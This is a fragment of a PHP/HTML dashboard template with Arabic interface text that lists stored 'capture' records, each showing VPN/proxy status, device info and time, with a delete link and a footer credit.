                                    <span>VPN / Proxy:</span> 
                                    <span style="color: <?php echo (strpos($cap['vpn_status'], 'Yes') !== false) ? '#f43f5e' : '#38bdf8'; ?>; font-weight: bold;">
                                        <?php echo htmlspecialchars($cap['vpn_status']); ?>
                                    </span>
                                </div>
                                <div class="info-row">
                                    <span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span>
                                </div>
                                <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                    <span>Time:</span> <span style="color:#a78bfa; font-weight:bold;"><?php echo htmlspecialchars($cap['created_at']); ?></span>
                                </div>
                                
                                <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذا السجل؟');">حذف السجل</a>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>

    </div>

    <!-- إشعار النسخ (Toast) -->
    <div class="toast" id="toast">✅ تم النسخ بنجاح!</div>

    <footer>
        <p>Developed by <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
